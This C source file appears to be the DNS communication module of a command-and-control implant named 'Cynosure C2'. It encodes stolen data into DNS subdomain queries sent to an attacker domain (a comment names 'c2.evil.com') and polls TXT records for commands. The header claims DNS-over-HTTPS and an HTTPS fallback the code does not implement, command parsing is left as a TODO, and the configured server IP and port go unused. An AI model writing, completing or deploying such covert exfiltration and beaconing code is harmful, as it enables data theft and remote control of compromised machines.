/*
 * DNS Communication Module for Cynosure C2
 *
 * Implements DNS-over-HTTPS (DoH) for stealthy C2 communication
 * Uses standard DNS queries to exfiltrate data and receive commands
 * Falls back to HTTPS for large payloads
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windns.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#endif

/* DNS communication context */
typedef struct {
    char domain[256];          /* C2 domain (e.g., c2.evil.com) */
    char server_ip[64];        /* DNS server IP */
    int port;                  /* Port (usually 53 or 5053) */
    int enabled;               /* Whether DNS comm is active */
    unsigned long beacon_count;
    unsigned long last_beacon;
} dns_comm_ctx_t;

static dns_comm_ctx_t dns_ctx = {
    .domain = "beacon.internal",
    .server_ip = "8.8.8.8",    /* Default to Google DNS */
    .port = 53,
    .enabled = 1,
    .beacon_count = 0,
    .last_beacon = 0,
};

/*
 * DNS Data Encoding: Encode 16 bytes of data into a DNS subdomain
 *
 * Example: 16 bytes of data → "a1b2c3d4e5f6g7h8.beacon.internal"
 * This allows 16 bytes per DNS query (very stealthy, low-volume)
 */
static void encode_data_to_dns(const unsigned char *data, size_t len,
                               char *subdomain, size_t subdomain_size) {
    static const char *charset = "abcdefghijklmnopqrstuvwxyz0123456789";

    if (len > 16) len = 16;  /* Max 16 bytes per query */

    size_t idx = 0;
    for (size_t i = 0; i < len && idx < subdomain_size - 1; i++) {
        unsigned char b = data[i];

        /* Encode high and low nibbles */
        subdomain[idx++] = charset[(b >> 4) & 0x0F];
        if (idx < subdomain_size - 1) {
            subdomain[idx++] = charset[b & 0x0F];
        }
    }
    subdomain[idx] = '\0';
}

/*
 * Create DNS query: "encoded_data.seq_number.c2_domain"
 * Example: "a1b2c3d4.0001.beacon.internal"
 */
static void create_dns_query(const unsigned char *data, size_t len,
                             unsigned int seq, char *fqdn, size_t fqdn_size) {
    char encoded[64];
    encode_data_to_dns(data, len, encoded, sizeof(encoded));

    snprintf(fqdn, fqdn_size, "%s.%04u.%s", encoded, seq, dns_ctx.domain);
}

/*
 * Send DNS query for data exfiltration
 * Each DNS A record query encodes 16 bytes of C2 data
 */
int dns_send_data(const unsigned char *data, size_t len) {
    if (!dns_ctx.enabled) {
        return -1;
    }

#ifdef _WIN32
    /* Windows: Use DnsQuery API */
    char fqdn[512];
    DNS_STATUS status;
    PDNS_RECORD pDnsRecord = NULL;

    create_dns_query(data, len, dns_ctx.beacon_count, fqdn, sizeof(fqdn));

    /* Query DNS A record (will encode data in subdomain) */
    status = DnsQuery_A(
        fqdn,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status != DNS_RCODE_NOERROR && status != 0) {
        fprintf(stderr, "[DNS] Query failed for %s: %ld\n", fqdn, status);
        return -1;
    }

    if (pDnsRecord) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }

    dns_ctx.beacon_count++;
    dns_ctx.last_beacon = time(NULL);

    return (int)len;
#else
    /* Unix/Linux: Use standard DNS resolution */
    char fqdn[512];
    struct hostent *he;

    create_dns_query(data, len, dns_ctx.beacon_count, fqdn, sizeof(fqdn));

    he = gethostbyname(fqdn);
    if (!he) {
        fprintf(stderr, "[DNS] Resolution failed for %s\n", fqdn);
        return -1;
    }

    dns_ctx.beacon_count++;
    dns_ctx.last_beacon = time(NULL);

    return (int)len;
#endif
}

/*
 * Receive command via DNS TXT record response
 * Server encodes command in TXT record of "cmd.seq.c2_domain"
 */
int dns_recv_command(unsigned char *buffer, size_t buffer_size) {
    if (!dns_ctx.enabled) {
        return -1;
    }

#ifdef _WIN32
    char fqdn[512];
    DNS_STATUS status;
    PDNS_RECORD pDnsRecord = NULL;

    /* Query for "cmd.SEQ.c2_domain" TXT record */
    snprintf(fqdn, sizeof(fqdn), "cmd.%04lu.%s", dns_ctx.beacon_count, dns_ctx.domain);

    /* Use raw constant: DNS_TYPE_TXT = 16 */
    status = DnsQuery_A(
        fqdn,
        16,  /* DNS_TYPE_TXT */
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status != 0) {
        return 0;  /* No command available */
    }

    /* Extract data from TXT record (would be encoded like A record) */
    if (pDnsRecord) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }

    return 0;  /* TODO: Parse TXT response */
#else
    return 0;
#endif
}

/*
 * Initialize DNS communication module
 */
int dns_comm_init(const char *c2_domain, const char *server_ip) {
    if (!c2_domain || !server_ip) {
        return -1;
    }

    strncpy(dns_ctx.domain, c2_domain, sizeof(dns_ctx.domain) - 1);
    strncpy(dns_ctx.server_ip, server_ip, sizeof(dns_ctx.server_ip) - 1);

    printf("[DNS] Initialized: domain=%s server=%s port=%d\n",
           dns_ctx.domain, dns_ctx.server_ip, dns_ctx.port);

    return 0;
}

/*
 * Get DNS communication status
 */
const char* dns_comm_status(void) {
    static char status[256];
    snprintf(status, sizeof(status),
             "DNS: enabled=%d domain=%s beacons=%lu",
             dns_ctx.enabled, dns_ctx.domain, dns_ctx.beacon_count);
    return status;
}

/*
 * Test DNS module
 */
int dns_comm_test(void) {
    unsigned char test_data[16] = {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10
    };

    printf("[DNS] Testing DNS communication...\n");

    int result = dns_send_data(test_data, sizeof(test_data));
    if (result > 0) {
        printf("[DNS] Test successful: sent %d bytes\n", result);
        return 0;
    } else {
        printf("[DNS] Test failed\n");
        return -1;
    }
}
